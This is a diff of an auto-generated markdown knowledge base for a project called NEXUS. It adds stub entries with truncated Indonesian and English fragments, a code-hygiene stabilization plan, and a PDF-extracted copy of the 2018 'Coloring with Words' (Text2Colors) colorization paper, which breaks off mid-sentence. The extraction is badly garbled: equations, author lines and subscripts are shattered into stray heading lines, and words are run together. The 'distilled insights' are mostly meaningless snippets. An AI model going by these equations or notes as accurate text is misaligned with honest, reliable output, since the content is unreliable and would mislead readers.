+> **Origin**: `ui-ux/NEXUS_HARDENING_PLAN.md` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+hasilkan false positives.
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_HARDENING_PLAN.md)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
 ### 📄 Identify heavy-running JavaScript
 > **Origin**: `ui-ux/NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD` | **Distilled At**: 26/05/2026
 
@@ -15476,6 +28657,78 @@ If you are moving custom elements using `moveBefore()`, their `connec...
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
+### 📄 NEXUS — Multi-Agent Test Suite (TALL Stack)
+> **Origin**: `ui-ux/NEXUS_NEXUS MULTI AGENT  TEST.MD` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+hasil analisis
+- gunakan ulang
+
+#### 🛠 Actionable Steps:
+action
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_NEXUS MULTI AGENT  TEST.MD)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
+### 📄 NEXUS — Post-Stabilization Hardening Guide
+> **Origin**: `ui-ux/NEXUS_NEXUS POST STABILIZATION HARDERING.MD` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+hasil
+
+Masih mungkin ada:
+
+```text
+hidden race conditions
+silent memory corruption
+non-deterministic outputs
+edge-case failures
+```
+
+#### 🛠 Actionable Steps:
+action-based memory write
+- queue-based execution (FIFO / priority)
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_NEXUS POST STABILIZATION HARDERING.MD)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
+### 📄 NEXUS — Architecture Weaknesses & Stabilization Recommendations
+> **Origin**: `ui-ux/NEXUS_NEXUS STABILIZATION.MD` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+Conclusion
+
+NEXUS memiliki:
+
+- visi kuat
+- fondasi bagus
+- struktur yang menjanjikan
+
+Tetapi keberhasilan jangka panjang sangat bergantung pada:
+
+```text
+architecture discipline
+```
+
+Bukan:
+
+- terminology futuristik
+- AGI branding
+- autonomous claims
+
+#### 🛠 Actionable Steps:
+Recommendations
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_NEXUS STABILIZATION.MD)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
 ### 📄 Omnibox Integration
 > **Origin**: `ui-ux/NEXUS_OMNIBOX.MD` | **Distilled At**: 26/05/2026
 
@@ -15546,6 +28799,20 @@ Traditional CSS easing functions like `ease-in` or `cubic-bezier()` are limited 
 
 #### 🔗 Traceability:
 - [Source Context](NEXUS_PHYSICS-BASED-EASING.MD)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
+### 📄 🛠 Implementation Plan: PLAN-1778479790742
+> **Origin**: `ui-ux/NEXUS_PLAN_PLAN-1778479790742.MD` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+Insights
+
+#### 🛠 Actionable Steps:
+Action**: Gunakan praktik terbaik standar industri.
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_PLAN_PLAN-1778479790742.MD)
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
@@ -15940,6 +29207,44 @@ Use the `@container` rule to apply styles when the container reaches a certain s
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
+### 📄 Implementation Plan: Nexus Core Stabilization & Hygiene
+> **Origin**: `ui-ux/NEXUS_STABILIZATION_PLAN.MD` | **Distilled At**: 26/05/2026
+
+#### 💡 Content Summary:
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+This plan addresses the critical bugs, architectural redundancies, and repository hygiene issues identified during the system audit.
+
+
+**Goal**: Eliminate duplicate methods, fix undefined variables, and clean up constructor logic.
+
+
+- [x] **Fix Constructor Redundancy**:
+    - Consolidate path assignments for `knowledgePath`, `recordsPath`, `summaryPath`, and `planningPath`.
+    - Ensure `resolvePath()` is used consistently.
+- [x] **Resolve `this.nexusPath` Bug**:
+    - Map `this.nexusPath` to `this.nexusDataPath` or fix the reference to use the correct variable.
+- [x] **Deduplicate Methods**:
+    - Remove the second definition of `getSemanticTags()` (lines 956-963).
+    - Remove the second definition of `globRecursive()` (lines 978-986).
+    - Ensure the remaining implementations are robust (handle absolute paths and different OS environments).
+
+
+**Goal**: Prevent runtime artifacts and temporary scripts from cluttering the repository.
+
+
+- [x] **Update `.gitignore`**:
+    - Add `scratch/` folder.
+    - Add session history archives: `knowledge/*_SESSION_HISTORY_ARCHIVE.md`.
+    - Add performance artifacts: `memory/distilled/performa...
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_STABILIZATION_PLAN.MD)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
 ### 📄 Stabilize Reactive State with Temporal
 > **Origin**: `ui-ux/NEXUS_STABILIZE-REACTIVE-STATE.MD` | **Distilled At**: 26/05/2026
 
@@ -15998,6 +29303,20 @@ const UserInvalidFallback = (() => {
 
 #### 🔗 Traceability:
 - [Source Context](NEXUS_STYLE-PARENT-WITH-HAS.MD)
+- [Related Standards](NEXUS_CORE_PRINCIPLES.md)
+
+---
+### 📄 Completion Summary:
+> **Origin**: `ui-ux/NEXUS_TES.MD` | **Distilled At**: 26/05/2026
+
+#### 🧐 Core Insights (Distilled):
+hasil dari test sandboxes harus memiliki dan menggunakan tailwind,alpinejs,laravel,livewire dan bisa saya bisa jalankan dg php artisan serve.
+
+Trajectory ID: 601882d5-6b83-46b5-ad32-124317620868
+Status: ✅ COMPLETED BY ANTIGRAVITY (2026-05-13)
+
+#### 🔗 Traceability:
+- [Source Context](NEXUS_TES.MD)
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
@@ -16904,6 +30223,954 @@ See `forms` (via `npx -y modern-web-guidance@latest retrieve "forms"`) for more 
 
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, api]
+
+### 📘 KNOWLEDGE: NEXUS_HYOJIN_BAHNG_COLORING_WITH_WORDS_ECCV_2018_PAPER.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+Coloring with Words: Guiding Image
+## Colorization Through Text-based Palette
+## Generation
+## Hyojin Bahng
+## *1[0000−0002−3571−9870]
+## , Seungjoo Yoo
+## *1[0000−0002−3078−8527]
+## ,
+## Wonwoong Cho
+## *1[0000−0003−0898−0341]
+## , David Keetae
+## Park
+## 1,3[0000−0001−9725−0193]
+## , Ziming Wu
+## 2[0000−0003−3348−7727]
+## , Xiaojuan
+## Ma
+## 2[0000−0002−9847−7784]
+, and Jaegul Choo
+## 1,3[0000−0003−1071−4835]
+## 1
+## Korea University
+## {hjj552,seungjooyoo,tyflehd21,heykeetae,jchoo}@korea.ac.kr
+## 2
+Hong Kong University of Science and Technology
+zwual@connect.ust.hk, mxj@cse.ust.hk
+## 3
+Clova AI Research, NAVER Corp.
+Abstract.This paper proposes a novel approach to generate multiple
+color palettes that reflect the semantics of input text and then colorize
+a given grayscale image according to the generated color palette. In con-
+trast to existing approaches, our model can understand rich text, whether
+it is a single word, a phrase, or a sentence, and generate multiple possible
+palettes from it. For this task, we introduce our manually curated dataset
+called Palette-and-Text (PAT). Our proposed model called Text2Colors
+consists of two conditional generative adversarial networks: the text-to-
+palette generation networks and the palette-based colorization networks.
+The former captures the semantics of the text input and produce rele-
+vant color palettes. The latter colorizes a grayscale image using the gen-
+erated color palette. Our evaluation results show that peoplepreferred
+our  generated  palettes  over  ground  truth  palettes  and  that  our  model
+can effectively reflect the given palette when colorizing an image.
+Keywords:Color Palette Generation·Image Colorization·Conditional
+## Generative Adversarial Networks.
+## 1  Introduction
+Humans can associate certain words with certain colors. The real questionis, can
+machines effectively learn the relationship between color and text?Using text
+to express colors can allow ample room for creativity, and it would be useful
+to visualize the colors of a certain semantic concept. For instance, since colors
+can leave a strong impression on people [19], corporations often decide upon the
+season‘s color theme from marketing concepts such as ‘passion.’ Through text
+## *
+These authors contributed equally.
+
+2Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+Fig. 1. Colorization results of Text2Colors given text inputs.The text input
+is shown above the input grayscale image, and the generated palettes are on the right
+of the grayscale image. The color palette is well-reflected in the colorized image when
+compared  to  the  ground  truth  image.  Our  model  is  applicable  to  a  wide  variety  of
+images ranging from photos to patterns (top right).
+input, even people without artistic backgrounds can easily create colorpalettes
+that convey high-level concepts. Since our model uses text to visualize aesthetic
+concepts, its range of future applications can encompass text to even speech.
+Previous methods have a limited range of applications as they only take a
+single word as input and can recommend only a single color or a color palette
+in pre-existing datasets [12, 8, 15, 25]. Other studies have further attempted to
+link a single word with a multi-color palette [21, 36] since multi-color palettes
+are highly expressive in conveying semantics [18]. Compared to theseprevious
+studies, our model can generate multiple plausible color palettes when given rich
+text input, including both single- and multi-word descriptions,greatly increasing
+the boundary of creative expression through words.
+In this paper, we propose a novel method to generate multiple color palettes
+that convey the semantics of rich text and then colorize a given grayscale im-
+age according to the generated color palette. Perception of color is inherently
+multimodal [4], meaning that a particular text input can be mapped to multiple
+possible color palettes. To incorporate such multimodality into our model, our
+palette generation networks are designed to generate multiple palettes from a
+single text input. We further apply our generated color palette to thecoloriza-
+tion task. Motivated from previous user-guided colorizations that utilize color
+hints given by users [42, 44], we design our colorization networks to utilize color
+palettes during the colorization process. Our evaluation demonstrates that the
+
+Text2Colors3
+Fig. 2. How Text2Colors works.Our  model  can  produce  a  diverse  selection  of
+palettes  when  given  a  text  input.  Users  can  optionally  choosewhich  palette  to  be
+applied to the final colorization output.
+colorized outputs do not only reflect the colors in the palette but also convey
+the semantics of the text input.
+The contribution of this paper includes:
+(1) We propose a novel deep neural network architecture that can generate mul-
+tiple color palettes based on natural-language text input.
+(2) Our model is able to use the generated palette to produce plausible coloriza-
+tions of a grayscale image.
+(3) We introduce our manually curated dataset called Palette-and-Text(PAT),
+which includes 10,183 pairs of a multi-word text and a multi-color palette.
+## 4
+## 2  Related Work
+Color SemanticsMeanings associated with a color are both innate and learned [9].
+For instance, red can make us instinctively feel alert [9]. Since color has a strong
+association with high-level semantic concepts [10], producing palettes from text
+input is useful in aiding artists and designers [18] and allows automaticcoloriza-
+tion from palettes [42, 5]. A downside to using text to choose a filter is that filter
+names do not usually convey the filter’s colors [21], thus making it difficult for
+users to find the filter that matches their taste just by looking at filter names. To
+bridge this discrepancy between color palettes and their names, palette recom-
+mendation based on user text input has long been studied. Query-based meth-
+ods [21, 36] use text inputs to query an image from an image dictionary where
+colors are extracted from the queried image to make an associated palette.This
+method is problematic in that the text input is mapped to the image content
+of the queried image rather than the color that the text implies. Instead of
+looking for a target directly, learning-based approaches [14, 27, 23] match color
+palettes to their linguistic descriptions by learning their semantic association
+from large-scale data. However, our model is the only generative model that
+supports phrase-level input.
+## 4
+Dataset   and   codes   are   publicly   available   at   https://github.com/awesome-
+davian/Text2Colors/
+
+4Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+Conditional GANsConditional generative adversarial networks (cGAN) are
+GAN models that use conditional information for the discriminator and the
+generator [24]. cGANs have drawn promising results for image generation from
+text [32, 31, 43] and image-to-image translation [16, 13, 7]. StackGAN [43] is the
+first model to use conditional loss for text to image synthesis. Our model is
+the first to utilize the conditioning augmentation technique from StackGAN to
+output diverse palettes even when given the same input text.
+Interactive ColorizationColorization is a multimodal task and desired col-
+orization results for the same object may vary from person to person [4]. A
+number of studies introduce interactive methods that allow users to control the
+final colorization output [44, 20]. In these models, users directly interact with the
+model by pinpointing where to color. Even though these methods achieve satis-
+factory results, a limitation is that users need to have a certain level of artistic
+skill. Thus instead of making the user directly color an image, other studies take
+a more indirect approach by utilizing color palettes to recolor an image [3,5].
+Palette-based filters of our model are an effective way for non-expertsto recolor
+an image [3].
+Sequence-to-Sequence with AttentionRecurrent Neural Networks (RNNs)
+are a popular tool due to their superior ability to learn from sequential data.
+RNNs are used in various tasks including sentence classification [39], text gener-
+ation [37], and sequence-to-sequence prediction [38]. Incorporating attention into
+a sequence-to-sequence model is known to improve the model performance [22]
+as networks learn to selectively focus on parts of a source sentence.This allows
+a model to learn relations between different modalities as is done byour model
+(e.g., text - colors, text - action [1], and English - French [40]).
+3  Palette-and-Text (PAT) Dataset
+This section introduces our manually curated dataset named Palette-and-Text
+(PAT). PAT contains 10,183 text and five-color palette pairs, where the set of
+five colors in a palette is associated with its corresponding text description as
+shown in Figs. 3(b)-(d). Words vary with respect to their relationships with
+colors; some words are direct color words (e.g., pink, blue, etc.) while others
+evoke a particular set of colors (e.g., autumn or vibrant). To the best of our
+knowledge, there has been no dataset that matches a multi-word text and its
+corresponding 5-color palette. This dataset allows us to train our models for
+predicting semantically consistent color palettes with textual inputs.
+Other Color DatasetsMunroe‘s color survey [26] is a widely used large-
+scale color corpus. Based on crowd-sourced user judgment, it matches atext to
+a single color. Another dataset, Kobayashi‘s Color Image Scale [18], is a well-
+established multi-color dataset. Kobayashi only uses 180 adjectives toexpress
+
+Text2Colors5
+Fig. 3. Our Palette-and-Text (PAT) dataset.On the left are diverse text-palette
+pairs  included  in  PAT.  PAT  has  a  very  wide  range  of  expression,  especially  when
+compared to existing datasets. Our dataset is designed to address rich text and multi-
+modality, where the same word can be mapped to a wide range of possible colors.
+1170 three-color palettes, which greatly limits its range of expression.In con-
+trast, our dataset is made up of 4,312 unique words. This includes much more
+text that was not traditionally used to express colors. Our task requires a more
+sophisticated dataset like PAT, that matches a text to multiple colors and is
+large enough for a deep learning model to learn from.
+Data CollectionWe generated our PAT dataset by refining user-named palette
+data crawled from a community website called color-hex.com. Thousands of users
+upload custom-made color palettes on color-hex, and thus our dataset was able
+to incorporate a wide pool of opinions. We crawled 47,665 palette-text pairs and
+removed non-alphanumerical and non-English words. Among them, we found
+that users sometimes assign palette names in an arbitrary manner, missing their
+semantic consistency with their corresponding color palettes. Somenames are a
+collection of random words (e.g., ‘mehmeh’ and ‘i spilled tea all over my laptop
+rip’), or are riddled with typos (e.g., ‘cause iiiiii see right through you boyyyyy’
+and ‘greene gardn’). Thus, using unrefined raw palette names would hinder model
+performances significantly.
+To refine the noisy raw data, four annotators voted whether the text paired
+with the color palette properly matches its semantic meanings. We then used
+only the text-palette pairs in which at least three annotators out of four agreed
+that semantic matching exists between the text and color palette. Including text-
+palette pairs in the dataset only when all four annotators agree was found to
+be unnecessarily strict, leaving not much room for personal subjectivity. An-
+notators perception is inherently subjective, meaning that a text-palette pair
+perfectly plausible to one person may not be agreeable to another. We wanted
+to incorporate such subjectivity by allowing a diverse selectionof text-palette
+pairs. Mis-spelling and punctuation errors were manually correctedafter the
+annotators finished sorting out the data.
+
+6Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+Fig. 4. Overview of our Text2Colors architecture.During training, generatorG
+## 0
+learns to produce a color palette ˆygiven a set of conditional variables ˆcprocessed from
+input textx={x
+## 1
+,· · ·, x
+## T
+}. GeneratorG
+## 1
+learns to predict a colorized output of a
+grayscale imageLgiven a palettepextracted from the ground truth image. At test
+time, the trained generatorsG
+## 0
+andG
+## 1
+are used to produce a color palette from given
+text and then colorize a grayscale image reflecting the generatedpalette.
+4  Text2Colors: Text-Driven Colorization
+Text2Colors consists of two networks: Text-to-Palette Generation Networks (TPN)
+and Palette-based Colorization Networks (PCN). We train the first networks
+to generate color palettes given a multi-word text and then train the second
+networks to predict reasonable colorizations given a grayscale image and the
+generated palettes. We utilize conditional GANs (cGAN) for both networks.
+4.1  Text-to-Palette Generation Networks (TPN)
+Objective FunctionIn this section, we illustrate the Text-to-Palette Genera-
+tion Networks shown in Figs. 4 and 5. TPN produces reasonable color palettes
+associated with the text input. Letx
+i
+## ∈R
+## 300
+be word vectors initialized by
+300-dimensional pre-trained vectors from GloVe [29]. Words not included in the
+pre-trained set are initialized randomly. Using the CIELabspace for our task,
+y∈R
+## 15
+represents a 15-dimensional color palette consisting of five colors with
+Labvalues. After a GRU encoder encodesxinto hidden statesh={h
+## 1
+,· · ·, h
+## T
+## },
+we add random noise to the encoded representation of text by sampling latent
+variables ˆcfrom a Gaussian distributionN(μ(h), Σ(h)). The sequence of condi-
+tioning vectors ˆc={ˆc
+## 1
+## ,· · ·,ˆc
+## T
+}is given asconditionfor the generator to output
+a palette ˆy, while its mean vector  ̄c=
+## 1
+## T
+## ∑
+## T
+i=1
+ˆcis given as the condition for the
+discriminator. Our objective function of the first cGAN can be expressed as
+## L
+## D
+## 0
+## =E
+y∼P
+data
+[logD
+## 0
+( ̄c, y)] +E
+x∼P
+data
+[log(1−D
+## 0
+## ( ̄c,ˆy))],(1)
+## L
+## G
+## 0
+## =E
+x∼P
+data
+[log(1−D
+## 0
+## ( ̄c,ˆy))],
+## (2)
+where discriminatorD
+## 0
+tries to maximizeL
+## D
+## 0
+against generatorG
+## 0
+that tries
+to minimizeL
+## G
+## 0
+. The pre-trained word vectorsxand the real color paletteyis
+sampled from true data distributionP
+data
+## .
+
+Text2Colors7
+Fig. 5.Model architecture of a generatorG
+## 0
+that produces thet-th color in the palette
+given a sequence of conditioning variables  ˆc={ˆc
+## 1
+## ,· · ·,ˆc
+## T
+}processed from an input
+textx={x
+## 1
+,· · ·, x
+## T
+}. Note that randomness is added to the encoded representation
+of text before it is passed to the generator.
+Previous approaches have benefited from mixing the GAN objective with
+## L
+## 2
+distance [28] orL
+## 1
+distance [13]. We have explored previous loss options
+and found the Huber (or smoothL
+## 1
+) loss to be the most effective in increasing
+diversity among colors in generated palettes. The Huber loss is given by
+## L
+## H
+(ˆy, y) =
+## {
+## 1
+## 2
+## (ˆy−y)
+## 2
+for|ˆy−y| ≤δ
+δ|ˆy−y| −
+## 1
+## 2
+δ
+## 2
+otherwise.
+## (3)
+This loss term is added to the generator’s objective function to forcethe gen-
+erated palette to be close to the ground truth palette. We also adopted the
+Kullback-Leibler (KL) divergence regularization term [43], i.e.,
+## D
+## KL
+(N(μ(h), Σ(h))k N(0, I)),(4)
+which is added to the generator’s objective function to further enforce the
+smoothness over the conditioning manifold. Our final objective function is
+## L
+## D
+## 0
+## =E
+y∼P
+data
+[logD
+## 0
+( ̄c, y)] +E
+x∼P
+data
+[log(1−D
+## 0
+## ( ̄c,ˆy))],(5)
+## L
+## G
+## 0
+## =E
+x∼P
+data
+[log(1−D
+## 0
+## ( ̄c,ˆy))] +λ
+## H
+## L
+## H
+(ˆy, y)
+## +λ
+## KL
+## D
+## KL
+(N(μ(h), Σ(h))k N(0, I)),
+## (6)
+λ
+## H
+andλ
+## KL
+are the hyperparameters to balance the three terms in Eq. 6. We
+setδ= 1, λ
+## H
+= 100, λ
+## KL
+= 0.5 in our model.
+## Networks Architecture
+Encoding Text through Conditioning Augmentation.Learning a mapping from
+text to color is inherently multimodal. For instance, a text ‘autumn’ can be
+mapped to a variety of plausible color palettes. As text becomes longer, such
+
+8Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+as ‘midsummer to autumn’ or ‘autumn breeze and falling leaves’, thescope of
+possible matching palettes becomes more broad and diverse. To appropriately
+model the multimodality of our problem, we utilize the conditioning augmenta-
+tion (CA) [43] technique. Rather than using the fixed sequence of encoded text
+as input to our generator, we randomly sample latent vector ˆcfrom a Gaus-
+sian distributionN(μ(h), Σ(h)) as shown in Fig. 5. This randomness allows our
+model to generate multiple plausible palettes given same text input.
+To obtain the conditioning variable ˆc={ˆc
+## 1
+## ,· · ·,ˆc
+## T
+}, the pre-trained word
+vectorsx={x
+## 1
+,· · ·, x
+## T
+}are first fed into a GRU encoder to compute hidden
+statesh={h
+## 1
+,· · ·, h
+## T
+}. This text representation is fed into a fully-connected
+layer to generateμandσ(the values in the diagonal ofΣ) for the Gaussian
+distributionN(μ(h), Σ(h)). Conditioning variable ˆcis computed by ˆc=μ+σ⊙ǫ,
+where⊙is the element-wise multiplication andǫ∼ N(0, I). The resulting set of
+vectors ˆc={ˆc
+## 1
+## ,· · ·,ˆc
+## T
+}will be used asconditionfor our generator.
+Generator.We design our generatorG
+## 0
+as a variant of a GRU decoder with
+attention mechanism [22, 2, 6]. Thei-th color of the palette ˆy
+i
+is computed as
+## ˆy
+i
+## =f(s
+i
+) wheres
+i
+## =g(ˆy
+i−1
+, c
+i
+, s
+i−1
+## ).(7)
+s
+i
+is a GRU hidden state vector for timei, having the previously generated color
+## ˆy
+i−1
+, the context vectorc
+i
+, and the previous hidden states
+i−1
+as input. The
+GRU hidden states
+i
+is given as input to a fully-connected layerfto output
+thei-th color of the palette ˆy
+i
+## ∈R
+## 3
+. The resulting five colors are combined to
+produce a single palette output ˆy.
+The context vectorc
+i
+depends on a sequence of conditioning vectors ˆc=
+## {ˆc
+## 1
+## ,· · ·,ˆc
+## T
+}and the previous hidden states
+i−1
+. The context vectorc
+i
+is com-
+puted as the weighted sum of these conditions ˆc
+i
+’s, i.e.,
+c
+i
+## =
+## T
+## ∑
+j=1
+α
+ij
+## ˆc
+j
+## .(8)
+The weightα
+ij
+of each conditional variable ˆc
+j
+is computed by
+α
+ij
+## =
+exp(e
+ij
+## )
+## ∑
+## T
+k=1
+exp(e
+ik
+## )
+wheree
+ij
+## =a(s
+i−1
+## ,ˆc
+j
+## ).(9)
+a(s
+i−1
+## ,ˆc
+j
+## ) =w
+## T
+σ(W
+s
+s
+i−1
+## +W
+## ˆc
+## ˆc
+j
+## ),(10)
+whereσ(·) is a sigmoid activation function andwis a weight vector. The additive
+attention [2]a(s
+i−1
+## ,ˆc
+j
+) computes how well thej-th word of the text input
+matches thei-th color of the palette output. The scoreα
+ij
+is computed based on
+the GRU hidden states
+i−1
+and thej-th condition ˆc
+j
+. The attention mechanism
+enables the model to effectively map complex text input to the palette output.
+Discriminator.For the discriminatorD
+## 0
+, the conditioning variable  ̄cand the
+color palette are concatenated and fed into a series of fully-connectedlayers. By
+jointly learning features across the encoded text and palette, the discriminator
+classifies whether the palettes are real or fake.
+
+Text2Colors9
+4.2  Palette-based Colorization Networks (PCN)
+Objective FunctionThe goal of the second networks is to automatically pro-
+duce colorizations of a grayscale image guided by the color palette as a condi-
+tioning variable. The inputs are a grayscale imageL∈R
+## H×W×1
+representing
+the lightness in CIELabspace and a color palettep∈R
+## 15
+consisting of five
+colors inLabvalues. The output
+## ˆ
+## I∈R
+## H×W×2
+corresponds to the predictedab
+color channels of the image. The objective function of the second model can be
+expressed as
+## L
+## D
+## 1
+## =E
+## I∼P
+data
+[logD
+## 1
+(p, I)] +E
+## ˆ
+## I∼P
+## G
+## 1
+[log(1−D
+## 1
+## (p,
+## ˆ
+## I))],(11)
+## L
+## G
+## 1
+## =E
+## ˆ
+## I∼P
+## G
+## 1
+[log(1−D
+## 1
+## (p,
+## ˆ
+## I))] +λ
+## H
+## L
+## H
+## (
+## ˆ
+## I, I).(12)
+## D
+## 1
+andG
+## 1
+included in the equation are shown in Fig.4. We have also added the
+Huber loss to the generator’s objective function. In other words, the generator
+learns to be close to the ground truth image withplausiblecolorizations, while
+incorporating palette colors to the output image to fool the discriminator. We
+setλ
+## H
+= 10 in our model.
+## Networks Architecture
+Generator.The generator consists of two sub-networks: the main colorization
+networks and the conditioning networks. Our main colorization networksadopts
+the U-Net architecture [33], which has shown promising results in colorization
+tasks [13, 44]. The skip connections help recover spatial information [33],as the
+input and the output images share the location of prominent edges [13].
+The role of the conditioning networks is to apply the palette colors to the
+generated image. During training, the networks are given a palettep∈R
+## 15
+extracted from the ground truth imageI. We utilize the Color Thief
+## 5
+function
+to extract a palette consisting of five dominant colors of the ground truthimage.
+Similar to the previous work [44], the conditioning palettepis fed into a series of
+1×1conv-relulayers as shown in Fig. 4. The feature maps in layers 1, 2, and 4
+are duplicated spatially to match the spatial dimension of theconv9,conv8, and
+conv4 features in the main colorization networks and added in an element-wise
+manner. The palettepis fed into upsampling layers with skip connections as
+well as the middle of the main networks. This allows the generator to detect
+prominent edges and apply palette colors to suitable locations of the image.
+During test time, we use the generated palette ˆyfrom the first networks (TPN)
+as the conditioning variable, colorizing the grayscale image with the predicted
+palette colors.
+Discriminator.As our discriminatorD
+## 1
+, we use a variant of the DCGAN archi-
+tecture [30]. The image and conditioning variablepare concatenated and fed into
+a series ofconv-leaky relulayers to jointly learn features across the image and
+the palette. Afterwards, it is fed into a fully-connected layer to classify whether
+the image is real or fake.
+## 5
+http://lokeshdhakar.com/projects/color-thief/
+
+10Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+Fig. 6. Comparison to baselines and qualitative analysis onmultimodality:
+Our TPN generates appealing color palettes that reflect all details of the text input.
+Also our model can generate multiple palettes with the same text input(three rows from
+bottom). In comparison, Heer and Stone [12]‘s model frequentlygenerates unrelated
+colors and has deterministic outputs.
+## 4.3  Implementation Details
+We first trainD
+## 0
+andG
+## 0
+of TPN for 500 epochs using the PAT dataset. We then
+trainD
+## 1
+andG
+## 1
+of the PCN for 100 epochs, using the extracted palette from
+a ground truth image. Finally, we use the trained generatorsG
+## 0
+andG
+## 1
+during
+test time to colorize a grayscale image with generated palette ˆyfrom a text input
+x. All networks are trained using Adam optimizer [17] with a learning rate of
+0.0002. Weights were initialized from a Gaussian distribution with zeromean and
+standard deviation of 0.05. We set other hyper parameters asδ= 1, λ
+## H
+## = 100,
+andλ
+## KL
+## = 0.5.
+## 5  Experimental Results
+This section presents both quantitative and qualitative analyses of ourproposed
+model. We evaluate the TPN (Section 4.1) based on our PAT dataset. For the
+training of the PCN (Section 4.2), we use two different datasets, CUB-200-2011
+(CUB) [41] and ImageNet ILSVRC Object Detection (ImageNet dataset) [34].
+5.1  Analysis on Multimodality and Diversity of Generated Palettes
+This section discusses the evaluation on multimodality and diversity of our gen-
+erated palettes. Multimodality refers to how many different color palettes a single
+text input can be mapped to. In other words, if a single text can be expressed
+with more color palettes, the more multimodal it is. As shown in Fig. 6, our
+model is multimodal, while previous approaches are deterministic, meaning that
+it generates only a particular color palette when given a text input. Diversity
+within a palette refers to how diverse the colors included in a single palette are.
+Following the current standard for perceptual color distance measurement, we
+use the CIEDE2000 [35] on CIELabspace to compute a model’s multimodal-
+ity and diversity. To measure multimodality, we compute the average minimum
+
+Text2Colors11
+Fig. 7. Attention analysis.Attention scores measured by the TPN for two text input
+samples. Each box color (in green) denotes the attention scorecomputed in producing
+the corresponding color shown on top. The dashed-line boxes indicate the word that
+each color output attended to.
+distances between colors from different palettes. To measure diversity of a color
+palette, we measure the average pairwise distance between the five colors within
+a palette. All measurements are computed based on the test dataset.
+Results.Table 1 shows the multimodality and diversity measurement among the
+variants of our model. The CA module (Section 4.1) enables our networks to sug-
+gest multiple color palettes when given the same text input. The model variant
+without CA (the first row in Table 1) results in zero multimodality, indicating
+that the networks generate identical palettes for the same text input. Another
+palette generation model by Heer and Stone [12] also has zero multimodality.
+This shows that TPN is the only existing model that can adequately express mul-
+timodality, which is crucial in the domain of colors. Although Heer and Stone’s
+model has higher diversity than TPN, Fig. 6 shows that their palettescontain
+irrelevant colors that may increase diversity but decrease palettequality. On the
+other hand, TPN creates those palettes containing colors that well matcheach
+other. Results on the fooling rate will be further illustrated in Section 5.3.
+5.2  Analysis on Attention Outputs
+The attention module (Section 4.1) plays a role of attending to particular words
+in text input to predict the most suitable colors for the text input. Fig. 7 illus-
+trates how the predicted colors are influenced by attention scores. The green-
+colored boxes show attention scores computed for each word token when pre-
+dicting each corresponding color in the palette. Higher scores are indicated by
+dashed-line boxes. We observe that three colors generated by attending toghoul
+are all dark and gloomy, while the other two colors attending tofunare bright.
+This attention mechanism enables our model to thoroughly reflect the semantics
+included in text inputs of varying lengths.
+
+12Hyojin Bahng and Seungjoo Yoo and Wonwoong Cho
+Fig. 8. Qualitative analysis on semantic context.Our model reflects subtle nu-
+ance  differences  in  the  semantic  context  of  a  given  text  input  in  the  color  palette
+outputs. Except for the first column, all the text combinationsshown here are unseen
+data.
+Table 1. Quantitative analysis results
+Palette EvaluationUser Study: Part I
+Model Variations    Diversity   MultimodalityFooling Rate (%)
+Objective Function   CAMean  StdMeanStdMean  StdMax Min
+Ours (TPN)X19.36  8.740.00.0----
+Ours (TPN)O20.82  7.435.438.1156.212.776.737.1
+Heer and Stone-35.92 12.660.00.039.6  10.858.2  25.8
+Ground truth palette   -32.60 21.84------
+## 5.3  User Study
+We conduct a user study to reflect universal user opinions on the outputs of our
+model. Our user study is composed of two parts. The first part measures how
+the generated palettes match the text inputs. The second part is a survey that
+compares the performance of our palette-based colorization model to another
+state-of-the-art colorization model. 53 participants took part in our study.
+Part I: Matching between Text and Generated PalettesOur goal is to
+generate a palette with a strong semantic connection with the given text input.
+A natural way to evaluate it is to quantify the degree of connection between
+the text input and the generated palette, in comparison to the same text input
+and its ground truth palette. Given a text input, its generated palette, and the
+ground truth palette, we ask human observers to select the palette that best suits
+the text input. A fooling rate (FR) in this study indicates the relative number
+of generated palettes chosen over ground truth palettes. More people choosing
+the generated palette results in a higher FR. This measure has often been used
+to assess the quality of colorization results [44, 11]. We will use this metric to
+measure how much a text input matches its generated palette.
+
+Text2Colors13
+Fig. 9. Colorization performance comparisons. Mean and standard deviation val-
+ues for each question are reported for the baseline [44] and our PCN. Our PCN scores
+higher on all of the questions, showing that users are more satisfied with PCN.
+Study Procedure.Users participate in the user study over TPN and Heer and
+Stone’s model [12]. Each consists of 30 evaluations. We randomly choose a single
+data item out of 992 test data and show the text input along with the generated
+palette and the ground truth palette.
+Results.In Table 1, we measure the FR score for each person and compute
+the mean and the standard deviation (std) of all of the scores from participants.
+Max and min scores represent the highest and the lowest FR scores, respectively,
+recorded by a single person. While Heer and Stone’s model [12] shows low FR of
